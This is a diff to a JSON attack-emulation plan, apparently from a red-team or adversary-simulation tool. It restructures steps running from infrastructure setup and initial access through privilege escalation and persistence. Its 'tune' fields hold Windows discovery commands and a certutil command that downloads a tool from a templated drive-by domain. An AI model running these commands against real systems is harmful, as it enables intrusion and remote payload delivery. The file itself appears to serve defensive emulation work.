@@ -14,7 +14,8 @@
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -24,7 +25,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -34,7 +36,8 @@
                 "tool": "self.tool",
                 "exfil": "self.exfil",
                 "driveby": "self.driveby"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -46,7 +49,8 @@
                 "exfiltration": "self.exfil",
                 "driveby": "self.driveby",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -54,7 +58,8 @@
             "label": "Interfaces2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -62,7 +67,8 @@
             "label": "DNS2",
             "preconditions": {
                 "driveby": "self.driveby2"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -72,7 +78,8 @@
                 "payload": "help_win_x86.exe",
                 "driveby": "self.driveby2",
                 "driveby_ctl": "self.chimera"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Infrastructure",
@@ -80,7 +87,8 @@
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "InitialAccess",
@@ -91,7 +99,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Execution",
@@ -102,7 +111,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -112,10 +122,10 @@
                 "actuator_id": "self.actuator",
                 "tool": "self.tool",
                 "driveby": "self.driveby",
-                "target": "self.target_1",
-                "tune": {
-                    "infra": true
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "infra": true
             }
         },
         {
@@ -125,10 +135,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c netsh firewall show config && echo \"stderr: \u0001 Command not found\""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c netsh firewall show config && echo \"stderr: \u0001 Command not found\""
             }
         },
         {
@@ -138,10 +148,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c schtasks /query /fo LIST /v | findstr TaskName | findstr /V Microsoft && echo \"stderr: \u0001 Command not found\""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c schtasks /query /fo LIST /v | findstr TaskName | findstr /V Microsoft && echo \"stderr: \u0001 Command not found\""
             }
         },
         {
@@ -151,10 +161,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c set && echo \"stderr: \u0001 Command not found\""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c set && echo \"stderr: \u0001 Command not found\""
             }
         },
         {
@@ -164,10 +174,10 @@
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
-                "target": "self.target_1",
-                "tune": {
-                    "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain2}/${self.tool_name2}${self.temp_dir_name}\\${self.tool_name2}&& echo \"stderr: \u0001 Command not found\""
-                }
+                "target": "self.target_1"
+            },
+            "tune": {
+                "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain2}/${self.tool_name2}${self.temp_dir_name}\\${self.tool_name2}&& echo \"stderr: \u0001 Command not found\""
             }
         },
         {
@@ -180,7 +190,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1",
                 "target_2": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -191,7 +202,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "PrivilegeEscalation",
@@ -203,7 +215,8 @@
                 "tool": "self.tool",
                 "target_1": "self.target_1_elevated",
                 "target_2": "self.target_1_system"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "c2",
@@ -214,7 +227,8 @@
                 "tool": "self.tool",
                 "driveby": "self.driveby",
                 "target": "self.target_1_system"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Persistence",
@@ -226,7 +240,8 @@
                 "tool": "self.tool",
                 "src_dir": "self.temp_dir_name",
                 "target": "self.target_1_system"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -236,7 +251,8 @@
                 "agent": "self.agent_tgt1_system",
                 "tool": "self.tool",
                 "target": "self.target_1_system"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -246,7 +262,8 @@
                 "agent": "self.agent_tgt1_elevated",
                 "tool": "self.tool",
                 "target": "self.target_1_elevated"
-            }
+            },
+            "tune": null
         },
         {
             "tactic": "Utility",
@@ -256,7 +273,8 @@
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1"
-            }
+            },
+            "tune": null
         }
     ],
     "iocs": {
